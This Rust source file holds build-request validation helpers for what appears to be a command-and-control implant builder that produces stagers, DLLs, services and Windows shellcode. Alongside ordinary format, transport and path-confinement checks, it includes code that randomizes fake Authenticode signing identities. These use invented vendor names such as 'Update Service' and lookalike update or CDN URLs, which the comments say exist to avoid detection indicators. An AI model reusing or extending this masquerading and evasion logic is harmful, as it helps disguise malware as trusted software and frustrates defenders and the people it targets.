// ./src/build_validate.rs
// Shared build-request validation helpers used by both builder frontends:
// the CLI (src/bin/builder.rs) and the REST API (src/api/routes/builder.rs).
// Keeping the rules here guarantees the two paths reject the same broken
// combinations with the same messages.

use std::path::{Component, Path, PathBuf};

// ── Format x platform matrix ───────────────────────────────────────────

/// Formats that produce a Windows PE artifact and are therefore only
/// meaningful with platform=windows. dll/service have no ELF/Mach-O
/// equivalent in this pipeline: on linux/macos they would otherwise
/// silently produce a plain executable renamed to "*.dll".
const WINDOWS_ONLY_FORMATS: [&str; 6] =
    ["dll", "service", "shellcode", "donut", "pe_to_shellcode", "bin"];

/// Human-readable format x platform support matrix for error messages.
pub const FORMAT_PLATFORM_MATRIX: &str = "supported combinations: \
    exe: linux/linux-musl/windows/macos; \
    stager: linux/linux-musl/windows/macos; \
    dll/service: windows only; \
    shellcode/donut/pe_to_shellcode/bin: windows only; \
    pic_c: any platform (always emits Windows x64 shellcode)";

/// Reject format x platform combinations that would silently produce a
/// wrong artifact (e.g. format=dll on Linux yields an ELF executable
/// renamed "*.dll", not a shared library).
pub fn check_format_platform(format: &str, platform: &str) -> Result<(), String> {
    if WINDOWS_ONLY_FORMATS.contains(&format) && platform != "windows" {
        return Err(format!(
            "format={} requires platform=windows ({})",
            format, FORMAT_PLATFORM_MATRIX
        ));
    }
    Ok(())
}

// ── Transport x mode matrix ────────────────────────────────────────────

/// Reject hibernation with the HTTP(S) transports: the hibernation loop
/// drives ClientTransport::connect() once per cycle, which the polling
/// HTTP transport does not support - the agent would loop on connect
/// backoff forever and never check in.
pub fn check_hibernation_transport(hibernation: bool, transport: &str) -> Result<(), String> {
    if hibernation && matches!(transport, "http" | "https") {
        return Err(format!(
            "hibernation mode is incompatible with transport={}: hibernation uses \
             ClientTransport::connect(), which HTTP(S) polling does not support, so \
             the agent would never check in. Use tls/tcp_plain/named_pipe or disable \
             hibernation.",
            transport
        ));
    }
    Ok(())
}

// ── Authenticode signing identity ──────────────────────────────────────

/// Authenticode metadata for one signing operation. Static values across
/// every build are a trivial IOC, so any field the operator did not
/// override is randomized per call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SignIdentity {
    /// osslsigncode -n (program name shown in the UAC/signature dialog).
    pub name: String,
    /// osslsigncode -i (info URL embedded in the signature).
    pub url: String,
    /// Subject CN for the throwaway self-signed cert.
    pub cn: String,
}

const SIGN_COMPANIES: [&str; 8] = [
    "Northwind", "Contoso", "Fabrikam", "Woodgrove",
    "Bluepoint", "Riverstone", "Clearlake", "Hightower",
];
const SIGN_PRODUCTS: [&str; 8] = [
    "Update Service", "Sync Helper", "Device Health", "Cloud Agent",
    "Maintenance Host", "Config Service", "Telemetry Client", "Patch Helper",
];
const SIGN_HOSTS: [&str; 8] = [
    "update", "sync", "cdn", "static", "download", "files", "assets", "media",
];
const SIGN_TLDS: [&str; 4] = ["com", "net", "org", "io"];

/// Pick a pool entry by entropy byte. A free fn, not a closure: closure
/// return-type elision cannot express that the returned &str is tied to
/// the pool's inner lifetime.
fn pick<'p>(pool: &'p [&'p str], bytes: &[u8; 16], i: usize) -> &'p str {
    pool[(bytes[i] as usize) % pool.len()]
}

/// Generate a randomized signing identity. The uuid tag embedded in `url`
/// and `cn` guarantees two calls never produce the same identity.
pub fn random_sign_identity() -> SignIdentity {
    let id = uuid::Uuid::new_v4();
    let bytes: [u8; 16] = *id.as_bytes();
    // Bind the hex string before slicing it - borrowing a slice of a
    // temporary through a method-call chain does not get lifetime extension.
    let id_hex = id.simple().to_string();
    let tag = &id_hex[..6];
    SignIdentity {
        name: format!("{} {}", pick(&SIGN_COMPANIES, &bytes, 0), pick(&SIGN_PRODUCTS, &bytes, 1)),
        url: format!("https://{}-{}.{}/", pick(&SIGN_HOSTS, &bytes, 2), tag, pick(&SIGN_TLDS, &bytes, 3)),
        cn: format!("{} {}", pick(&SIGN_COMPANIES, &bytes, 4), tag),
    }
}

/// Strip characters that would corrupt the openssl -subj argument or the
/// osslsigncode command line from an operator-supplied override.
pub fn sanitize_sign_field(value: &str) -> String {
    value.chars()
        .filter(|c| !c.is_control() && *c != '/' && *c != '\\')
        .collect()
}

// ── Server-side path confinement ───────────────────────────────────────

/// Lexically normalize a path: "." components are dropped. ".." components
/// must be rejected by the caller before this runs. Never touches the
/// filesystem, so it works for paths that do not exist yet.
fn lexical_normalize(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::CurDir => {}
            other => out.push(other.as_os_str()),
        }
    }
    out
}

/// Resolve `value` (against `base` when relative) and require the result
/// to live under one of `allowed_roots`. Empty values and any ".."
/// component are rejected. This confines operator-controlled builder paths
/// (icon, certs_dir) to their intended roots so an API operator token
/// cannot turn the builder into an arbitrary-file-read side channel.
pub fn confine_server_path(
    value: &str,
    base: &Path,
    allowed_roots: &[PathBuf],
) -> Result<PathBuf, String> {
    if value.trim().is_empty() {
        return Err("path must not be empty".into());
    }
    let raw = Path::new(value);
    if raw.components().any(|c| matches!(c, Component::ParentDir)) {
        return Err(format!("path '{}' must not contain '..'", value));
    }
    let joined = if raw.is_absolute() { raw.to_path_buf() } else { base.join(raw) };
    let candidate = lexical_normalize(&joined);
    if allowed_roots.iter().any(|root| candidate.starts_with(root)) {
        Ok(candidate)
    } else {
        Err(format!(
            "path '{}' is outside the allowed directories ({})",
            value,
            allowed_roots
                .iter()
                .map(|r| r.display().to_string())
                .collect::<Vec<_>>()
                .join(", ")
        ))
    }
}
